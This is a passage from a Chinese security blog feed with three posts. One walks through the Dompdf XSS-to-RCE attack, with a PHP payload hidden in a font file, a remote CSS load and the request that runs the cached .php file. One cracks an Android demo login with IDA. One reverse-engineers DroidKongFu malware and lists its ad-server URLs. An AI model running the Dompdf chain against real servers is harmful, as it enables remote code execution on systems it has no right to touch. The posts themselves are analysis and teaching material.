= @tempnam($this-&gt;options-&gt;get(&quot;tempDir&quot;), &quot;dompdf-font-&quot;);</span><br><span class="line">       file_put_contents($localTempFile, $remoteFileContent);</span><br><span class="line"></span><br><span class="line">       $font = Font::load($localTempFile);</span><br><span class="line"></span><br><span class="line">       if (!$font) &#123;</span><br><span class="line">           unlink($localTempFile);</span><br><span class="line">           return false;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $font-&gt;parse();</span><br><span class="line">       $font-&gt;saveAdobeFontMetrics(&quot;$cacheEntry.ufm&quot;);</span><br><span class="line">       $font-&gt;close();</span><br><span class="line"></span><br><span class="line">       unlink($localTempFile);</span><br><span class="line"></span><br><span class="line">       if ( !file_exists(&quot;$cacheEntry.ufm&quot;) ) &#123;</span><br><span class="line">           return false;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       // Save the changes</span><br><span class="line">       file_put_contents($localFile, $remoteFileContent);</span><br><span class="line"></span><br><span class="line">       if ( !file_exists($localFile) ) &#123;</span><br><span class="line">           unlink(&quot;$cacheEntry.ufm&quot;);</span><br><span class="line">           return false;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $this-&gt;setFontFamily($fontname, $entry);</span><br><span class="line">       $this-&gt;saveFontFamilies();</span><br><span class="line"></span><br><span class="line">       return true;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>可以从上方的代码看出新缓存本地文件名称为通过计算远程加载的文件的MD5值来构造的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$font = Font::load($localTempFile);</span><br></pre></td></tr></table></figure>

<p>这里文件通过php-font-lib进行加载和解析，但php-font-lib仅会检查加载文件的文件头，而忽略了文件扩展名</p>
<p>命令执行流程如下:</p>
<p>首先设置php文件头为有效的ttf字体，在其后添加恶意代码<?php phpinfo();?> </p>
<img src="/2022/04/20/Dompdf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220420160837821.png" class title="image-20220420160837821">

<p>然后在加载的css文件中包含该php文件，通过xss漏洞远程加载资源文件xxx.css</p>
<img src="/2022/04/20/Dompdf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220420161017574.png" class title="image-20220420161017574">

<p>访问xss链接引用远程css文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:9000/index.php?pdf&amp;title=&lt;link rel=stylesheet href=&#x27;http://localhost:9001/exploit.css&#x27;&gt;</span><br></pre></td></tr></table></figure>

<p>deopdf就会在&#x2F;lib&#x2F;font文件夹下缓存重命名php恶意文件</p>
<p>访问该php文件执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:9000/dompdf/lib/fonts/exploitfont_normal_3f83639933428d70e74a061f39009622.php</span><br></pre></td></tr></table></figure>

<img src="/2022/04/20/Dompdf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220420161258412.png" class title="image-20220420161258412">

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://cloud.tencent.com/developer/article/1978115">dompdf中未修补的RCE漏洞会影响HTML到PDF转换器 - 云+社区 - 腾讯云 (tencent.com)</a></p>
<p><a href="https://cn-sec.com/archives/831392.html">从 XSS 到 RCE (dompdf 0day) | CN-SEC 中文网</a></p>
<p><a href="https://mp.weixin.qq.com/s/VGWGvYvp4hA5_RwuIbHhSQ">利用dompdf将XSS升级为RCE (qq.com)</a></p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>Web应用漏洞</category>
        <category>Dompdf</category>
      </categories>
      <tags>
        <tag>-web漏洞 - Dompdf -命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>IDA动态破解登录验证</title>
    <url>/2023/03/12/IDA%E5%8A%A8%E6%80%81%E7%A0%B4%E8%A7%A3%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81/</url>
    <content><![CDATA[<h1 id="IDA动态破解登录验证"><a href="#IDA动态破解登录验证" class="headerlink" title="IDA动态破解登录验证"></a>IDA动态破解登录验证</h1><p>在测试app中输入用户名和密码，程序弹框”登陆失败”</p>
<img src="/2023/03/12/IDA%E5%8A%A8%E6%80%81%E7%A0%B4%E8%A7%A3%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81/image-20230812095229077.png" class title="image-20230812095229077">

<h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p>使用jeb打开测试app，没有搜索到”登陆失败”相关字符串，猜想字符串可能在so中</p>
<img src="/2023/03/12/IDA%E5%8A%A8%E6%80%81%E7%A0%B4%E8%A7%A3%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81/image-20230812100330234.png" class title="image-20230812100330234">



<p>打开AndroidManifest.xml查看程序入口<activity android:name="demo2.jni.com.myapplication.MainActivity">，这里”android:debuggable&#x3D;true”表示该apk可动态调试</activity></p>
<img src="/2023/03/12/IDA%E5%8A%A8%E6%80%81%E7%A0%B4%E8%A7%A3%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81/image-20230812100437084.png" class title="image-20230812100437084">



<p>我们进入MainActivity入口类并反编译成java代码，分析可得会调用Native方法myJNI.check()来校验用户名和密码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    EditText User_Name;</span><br><span class="line">    EditText User_Pass;</span><br><span class="line">    Context ct;</span><br><span class="line">    myJNI mj;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MainActivity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="keyword">this</span>.mj = <span class="keyword">new</span> myJNI();</span><br><span class="line">        <span class="keyword">this</span>.ct = ((Context)<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="keyword">this</span>.setContentView(<span class="number">2130968603</span>);</span><br><span class="line">        <span class="keyword">this</span>.User_Name = <span class="keyword">this</span>.findViewById(<span class="number">2131427416</span>);</span><br><span class="line">        <span class="keyword">this</span>.User_Pass = <span class="keyword">this</span>.findViewById(<span class="number">2131427417</span>);</span><br><span class="line">        <span class="keyword">this</span>.findViewById(<span class="number">2131427418</span>).setOnClickListener(<span class="keyword">new</span> View$OnClickListener() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                Toast.makeText(MainActivity.<span class="keyword">this</span>, MainActivity.<span class="keyword">this</span>.mj.check(MainActivity.<span class="keyword">this</span>.ct, MainActivity</span><br><span class="line">                        .<span class="keyword">this</span>.User_Name.getText().toString().trim(), MainActivity.<span class="keyword">this</span>.User_Pass.getText()</span><br><span class="line">                        .toString().trim()), <span class="number">0</span>).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到JniTest.so文件中的native方法</p>
<img src="/2023/03/12/IDA%E5%8A%A8%E6%80%81%E7%A0%B4%E8%A7%A3%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81/image-20230812105133814.png" class title="image-20230812105133814">

<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>我们来具体分析分析这个JniTest.so文件，解压apk安装包是使用IDA打开该文件进行分析</p>
<img src="/2023/03/12/IDA%E5%8A%A8%E6%80%81%E7%A0%B4%E8%A7%A3%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81/image-20230812111005689.png" class title="image-20230812111005689">

<p>在Exports导出表中可以找到myJNI_check方法</p>
<img src="/2023/03/12/IDA%E5%8A%A8%E6%80%81%E7%A0%B4%E8%A7%A3%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81/image-20230812111201064.png" class title="image-20230812111201064">

<p>跟进该myJNI_check方法，该IDA中显示的为汇编语言</p>
<img src="/2023/03/12/IDA%E5%8A%A8%E6%80%81%E7%A0%B4%E8%A7%A3%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81/image-20230812111241303.png" class title="image-20230812111241303">

<p>在IDA中按F5对其进行编译成C语言，为使得代码有好的可读性，添加jni.h文件，C语言代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">_JNIEnv *__cdecl <span class="title">Java_demo2_jni_com_myapplication_myJNI_check</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _JNIEnv *v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v7; <span class="comment">// esi</span></span><br><span class="line">  _JNIEnv *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+Ch] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v10; <span class="comment">// [esp+18h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v11; <span class="comment">// [esp+1Ch] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  v6 = (_JNIEnv *)getSignature(a1, a2, a3);</span><br><span class="line">  v7 = (<span class="keyword">const</span> <span class="keyword">char</span> *)(*(<span class="keyword">int</span> (__cdecl **)(<span class="keyword">int</span>, _JNIEnv *, _DWORD))(*(_DWORD *)a1 + <span class="number">676</span>))(a1, v6, <span class="number">0</span>);</span><br><span class="line">  v10 = (<span class="keyword">const</span> <span class="keyword">char</span> *)(*(<span class="keyword">int</span> (__cdecl **)(<span class="keyword">int</span>, <span class="keyword">int</span>, _DWORD))(*(_DWORD *)a1 + <span class="number">676</span>))(a1, a4, <span class="number">0</span>);</span><br><span class="line">  v11 = (<span class="keyword">const</span> <span class="keyword">char</span> *)(*(<span class="keyword">int</span> (__cdecl **)(<span class="keyword">int</span>, <span class="keyword">int</span>, _DWORD))(*(_DWORD *)a1 + <span class="number">676</span>))(a1, a5, <span class="number">0</span>);</span><br><span class="line">  __android_log_print(<span class="number">4</span>, <span class="string">&quot;JNI_LOG&quot;</span>, &amp;unk_8C4, v7);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(</span><br><span class="line">         v7,</span><br><span class="line">         <span class="string">&quot;308201dd30820146020101300d06092a864886f70d010105050030373116301406035504030c0d416e64726f69642044656275673110300&quot;</span></span><br><span class="line">         <span class="string">&quot;e060355040a0c07416e64726f6964310b3009060355040613025553301e170d3138303332313033303431385a170d343830333133303330&quot;</span></span><br><span class="line">         <span class="string">&quot;3431385a30373116301406035504030c0d416e64726f69642044656275673110300e060355040a0c07416e64726f6964310b30090603550&quot;</span></span><br><span class="line">         <span class="string">&quot;4061302555330819f300d06092a864886f70d010101050003818d00308189028181008270f53e2cf8c7d7ed200863deb85a054defde773b&quot;</span></span><br><span class="line">         <span class="string">&quot;e0b848ee792839d9a81da098dd9b74bbb9679c19ea30b63fe3bb74aabb270a5c9b3359ebe3fdf278b82fe576a6677f0d77f0eb5b088d071&quot;</span></span><br><span class="line">         <span class="string">&quot;1b15d03cadae08b3b980f28055d0cde4bbc4a0b4b208b0f30f170b6ea77a8620269fa1d375442653663e1dd41293aa1c4910e3502030100&quot;</span></span><br><span class="line">         <span class="string">&quot;01300d06092a864886f70d010105050003818100044b9ab7e85346a147926c2d1c6c30e8ffcce174f88acb9763cb776fb1f4dd62183c952&quot;</span></span><br><span class="line">         <span class="string">&quot;4346738ff1aea16c5fa218c68da76d05a2422aee12fc23563b5e28925c3d96dff855a584fc1ec462aa768277bd25739085d52fe3fedfd39&quot;</span></span><br><span class="line">         <span class="string">&quot;6e38180c13fbb289786e524535933dd8a99ed3154880544f3e41f044acc43ceefbbce3af59&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    __android_log_print(<span class="number">4</span>, <span class="string">&quot;JNI_LOG&quot;</span>, &amp;unk_8F3, v9);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  __android_log_print(<span class="number">4</span>, <span class="string">&quot;JNI_LOG&quot;</span>, &amp;unk_8DF, v9);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v10, <span class="string">&quot;koudai&quot;</span>) &amp;&amp; !<span class="built_in">strcmp</span>(v11, <span class="string">&quot;black&quot;</span>) )</span><br><span class="line">    result = (_JNIEnv *)(*(<span class="keyword">int</span> (__cdecl **)(<span class="keyword">int</span>, <span class="keyword">void</span> *))(*(_DWORD *)a1 + <span class="number">668</span>))(a1, &amp;unk_916);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = (_JNIEnv *)(*(<span class="keyword">int</span> (__cdecl **)(<span class="keyword">int</span>, <span class="keyword">void</span> *))(*(_DWORD *)a1 + <span class="number">668</span>))(a1, &amp;unk_923);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>该代码逻辑首先是比较程序前面和给定的数字字符串算法一致，一致则继续向下执行，否则退出程序</li>
<li>比较用户名和密码是否同时满足用户名&#x3D;koudai、密码&#x3D;black。满足则弹窗登陆成功，否则弹窗失败</li>
</ul>
<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>我们可以在动态调试so在程序运行的时候改变程序的跳转逻辑</p>
<p>1.将IDApro&#x2F;dbgsrv目录下的android_server到手机&#x2F;data&#x2F;local&#x2F;tmp&#x2F;目录下，给予777权限并运行</p>
<img src="/2023/03/12/IDA%E5%8A%A8%E6%80%81%E7%A0%B4%E8%A7%A3%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81/image-20230812115846528.png" class title="image-20230812115846528">

<p>运行成功后开启23946端口监听</p>
<img src="/2023/03/12/IDA%E5%8A%A8%E6%80%81%E7%A0%B4%E8%A7%A3%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81/image-20230812115939722.png" class title="image-20230812115939722">

<p>配置端口转发命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb forward tcp:23946 tcp:23946</span><br></pre></td></tr></table></figure>

<p>然后运行测试app然后打开IDA配置附加程序</p>
<img src="/2023/03/12/IDA%E5%8A%A8%E6%80%81%E7%A0%B4%E8%A7%A3%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81/image-20230812121349340.png" class title="image-20230812121349340">

<p>找到需要调试的包名</p>
<img src="/2023/03/12/IDA%E5%8A%A8%E6%80%81%E7%A0%B4%E8%A7%A3%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81/image-20230812121443869.png" class title="image-20230812121443869">

<p>调试界面如下</p>
<img src="/2023/03/12/IDA%E5%8A%A8%E6%80%81%E7%A0%B4%E8%A7%A3%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81/image-20230812121600978.png" class title="image-20230812121600978">

<p>在modules窗口中寻找libJnitest.so，点击可查看其中调用的函数</p>
<img src="/2023/03/12/IDA%E5%8A%A8%E6%80%81%E7%A0%B4%E8%A7%A3%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81/image-20230812133512687.png" class title="image-20230812133512687">]]></content>
      <categories>
        <category>逆向分析</category>
        <category>android</category>
        <category>案例分析</category>
      </categories>
      <tags>
        <tag>-逆向 -android</tag>
      </tags>
  </entry>
  <entry>
    <title>DroidKonngFu变种病毒实例分析</title>
    <url>/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="DroidKonngFu变种病毒实例分析"><a href="#DroidKonngFu变种病毒实例分析" class="headerlink" title="DroidKonngFu变种病毒实例分析"></a>DroidKonngFu变种病毒实例分析</h1><p>DroidKongFu病毒的主体是一个Android原生程序，通常被捆绑到正常的Android软件中，用户只要安装遭到捆绑的软件就会被感染该病毒。</p>
<h2 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h2><p>病毒分析讲究先动后静的分析步骤。首先动态分析捕获病毒执行的所有敏感操作，观察病毒运行时的症状，在了解病毒实现的功能后，再使用静态分析技术逆向病毒的功能代码，理清病毒的执行逻辑路线。</p>
<p>这里使用几款Android程序在线动态分析工具进行动态分析对照。分析得出APP基本信息以及其涉及的域名和访问的URL信息。</p>
<img src="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/image-20231009163520372.png" class title="image-20231009163520372">

<img src="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/image-20231009163927926.png" class title="image-20231009163927926">

<img src="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/image-20231009163857255.png" class title="image-20231009163857255">

<p>该app中还存在一些访问外部网站的URL</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ad.imadpush.com:7500/AppManager/index.php/AppPoster/mgPdownLog/down?appid=</span><br><span class="line">http://dd.phonego8.com:7500/ad/nadp.php?v=1.5&amp;id=</span><br><span class="line">http://n.wiyun.com/hsup/spi?device_id=</span><br><span class="line">http://e.domob.cn/report</span><br><span class="line">http://amob.acs86.com/a.htm?pv=1&amp;sp=</span><br><span class="line">http://r.domob.cn/a/</span><br><span class="line">http://d.wiyun.com/adv/d?t=</span><br><span class="line">http://cast.ra.imocha.com/p/?pid=</span><br><span class="line">http://dd.phonego8.com:7500/ad/nadp.php?v=1.5&amp;id=all</span><br><span class="line">http://dd.phonego8.com:7500/ad/nweb.php?v=1.5&amp;u=</span><br><span class="line">http://&#123;0&#125;/&#123;1&#125;</span><br><span class="line">http://r2.adwo.com/adweb</span><br><span class="line">http://amob.acs86.com/mst.htm?version=2.3.6</span><br><span class="line">http://www.facebook.com/otothel.apps</span><br><span class="line">http://proxy.youdraw.cn/api/proxy</span><br></pre></td></tr></table></figure>

<p>访问一下看看</p>
<img src="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/image-20231009164613834.png" class title="image-20231009164613834">

<p>根据以上的分析可以得出病毒大概执行的动作：</p>
<ul>
<li>获取手机敏感数据</li>
<li>访问外部网站</li>
<li>对手机进行了定位</li>
</ul>
<p>但这些信息还不足以理解病毒的完整运行过程，如病毒体的释放、系统目录读取等操作。</p>
<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>下面我们将从代码层面对病毒进行静态分析。DroidKongFu通过java层的Native函数启动病毒外壳，然后由病毒外壳来启动真正的病毒分析，所以主要从java层，Native启动层和核心层这三个方面来对其进行分析。</p>
<h3 id="java层"><a href="#java层" class="headerlink" title="java层"></a>java层</h3><p>在AndroidManifest.xml文件中可以得到如下信息</p>
<img src="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/image-20231009170409427.png" class title="image-20231009170409427">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Activity: </span><br><span class="line">MainActivity    ad.imadpush.com.poster.PosterInfoActivity</span><br><span class="line"></span><br><span class="line">Service: </span><br><span class="line">com.airpuh.ad.UpdateCheck    ad.imadpush.com.poster.AlarmService</span><br><span class="line"></span><br><span class="line">BroadcastReceiver: </span><br><span class="line">ad.imadpush.com.poster.ReceiverAlarm</span><br><span class="line"></span><br><span class="line">使用到以下权限：</span><br><span class="line">&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot;/&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot;/&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;/&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;android.permission.ACCESS_COARSE_LOCATION&quot;/&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>下面为MainActivity类的代码，前面主要是对程序运行时出现的两个按钮关联事件。首先判断移动设备是否以及是ROOT权限，对解锁和开始这两个按钮进行说明.这都是原程序本来的功能，接下来就是病毒需要做的事情。</p>
<img src="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/image-20231009214542129.png" class title="image-20231009214542129">

<img src="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/image-20231009214622105.png" class title="image-20231009214622105">

<p>关键代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#启动广告接受线程</span><br><span class="line">this.mAd2 = new NewAd(this);</span><br><span class="line">this.mAd2.startAd();</span><br><span class="line">#启动全局定时器</span><br><span class="line">new f(this);</span><br><span class="line">#启动服务</span><br><span class="line">Intent intent = new Intent();</span><br><span class="line">intent.setClass(this, UpdateCheck.class);</span><br><span class="line">startService(intent);</span><br></pre></td></tr></table></figure>



<p><strong>1.启动广告接收线程</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.mAd2 = <span class="keyword">new</span> NewAd(<span class="keyword">this</span>);</span><br><span class="line"><span class="keyword">this</span>.mAd2.startAd();</span><br></pre></td></tr></table></figure>

<p>首先实例化一个NewAd对象，然后调用其startAd()方法，startAd()方法代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startAd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> g(<span class="keyword">this</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>新建了一个g对象并调用了它的start()方法，跟踪g类代码原来是个线程类，所以Thread对象的start()方法执行的是它的run()方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">g</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="comment">/* synthetic */</span> NewAd a;</span><br><span class="line"></span><br><span class="line">    g(NewAd newAd) &#123;</span><br><span class="line">        <span class="keyword">this</span>.a = newAd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (!(<span class="keyword">this</span>.a.a)) &#123;</span><br><span class="line">            <span class="keyword">this</span>.a.a();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sleep(<span class="number">5000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>run()方法是一段循环代码，调用了NewAd类的a()方法，主要工作是访问网址”<a href="http://dd.phonego8.com:7500/ad/nadp.php?v=1.5&amp;id=all&quot;%E5%B9%B6%E8%A7%A3%E6%9E%90%E8%BF%94%E5%9B%9E%E7%9A%84%E7%BB%93%E6%9E%9C%EF%BC%8C%E6%A0%B9%E6%8D%AE%E4%B8%8D%E5%90%8C%E7%9A%84%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E8%B0%83%E7%94%A8%E4%B8%8D%E5%90%8C%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%8C%E5%B9%B6%E8%AE%BE%E7%BD%AEa%E7%9A%84%E5%80%BC%E4%B8%BAtrue%E3%80%82%E5%85%B6%E5%AE%9E%E5%B0%B1%E6%98%AF%E8%AF%B7%E6%B1%82%E4%B8%8D%E5%90%8C%E5%B9%BF%E5%91%8A%E5%95%86%E7%9A%84push%E5%B9%BF%E5%91%8A%E3%80%82">http://dd.phonego8.com:7500/ad/nadp.php?v=1.5&amp;id=all&quot;并解析返回的结果，根据不同的返回结果调用不同的方法，并设置a的值为true。其实就是请求不同广告商的push广告。</a></p>
<img src="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/image-20231009221358293.png" class title="image-20231009221358293">

<p><strong>2.启动全局定时器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new f(this);</span><br></pre></td></tr></table></figure>

<p>f类在初始化时执行了两个方法a()方法和b()方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">(Activity activity, <span class="keyword">boolean</span> z)</span> </span>&#123;</span><br><span class="line">       l.a = z;</span><br><span class="line">       a = activity;</span><br><span class="line">       <span class="keyword">this</span>.g = m.b(activity);<span class="comment">//获取userid值</span></span><br><span class="line">       d = activity.getSharedPreferences(<span class="string">&quot;jmuser&quot;</span>, <span class="number">0</span>);<span class="comment">//打开SharedPreferences中的jmuser.xml文件</span></span><br><span class="line">       d.edit().putLong(<span class="string">&quot;dId&quot;</span>, <span class="keyword">this</span>.g.longValue()).commit();<span class="comment">//将did和userid写入文件</span></span><br><span class="line">       <span class="keyword">new</span> c(<span class="keyword">this</span>).execute(<span class="keyword">null</span>, <span class="number">0</span>, <span class="keyword">null</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>a()方法中调用m.b()访问目标网址来获取userid值用来标识一个“合法”的用户，每个感染该病毒的手机通过这个userid获取广告，并将其和did一起写入SharedPreferences的jmuser.xml文件。</p>
<p>b()方法启动了一个周期为360000毫秒的全局定时器，对象为ReceiverAlarm.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">b</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        e = PendingIntent.getBroadcast(a, <span class="number">0</span>, <span class="keyword">new</span> Intent(a, ReceiverAlarm.class), <span class="number">0</span>);<span class="comment">//定义ReceiverAlarm</span></span><br><span class="line">        Calendar instance = Calendar.getInstance();<span class="comment">//构造一个pendingintent对象</span></span><br><span class="line">        instance.setTimeInMillis(System.currentTimeMillis());</span><br><span class="line">        l.a(<span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>).format(<span class="keyword">new</span> Date(instance.getTimeInMillis())));</span><br><span class="line">        c = (AlarmManager) a.getSystemService(<span class="string">&quot;alarm&quot;</span>);<span class="comment">//获取系统定时服务</span></span><br><span class="line">        c.setRepeating(<span class="number">0</span>, instance.getTimeInMillis(), <span class="number">360000</span>, e);<span class="comment">//启动定时器</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ReceiverAlarm类的OnReceive()方法只有一行代码，启动了AlarmService服务</p>
<img src="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/image-20231010163858146.png" class title="image-20231010163858146">

<p>AlarmService类中的onStart()方法在服务启动时获取系统的通知服务，然后调用AsyncTask的execute来向用户发送通知，诱骗用户安装广告服务。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void onStart(Intent intent, int i) &#123;</span><br><span class="line">       super.onStart(intent, i);</span><br><span class="line">       this.d = f.a;</span><br><span class="line">       this.e = Long.valueOf(f.d.getLong(&quot;userId&quot;, 0));</span><br><span class="line">       this.g = Long.valueOf(f.d.getLong(&quot;dId&quot;, 0));</span><br><span class="line">       a();</span><br><span class="line">       new g(this).execute(null, 0, null);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><strong>3.启动恶意服务</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Intent intent = new Intent();</span><br><span class="line">intent.setClass(this, UpdateCheck.class);</span><br><span class="line">startService(intent);</span><br></pre></td></tr></table></figure>

<p>通过上面三行代码启动恶意服务，启动了名称为updatecheck的服务，病毒主体就是通过它来启动的。我们跟踪该服务代码，它定义了一个静态方法用于加载原生动态链接库vadgo。</p>
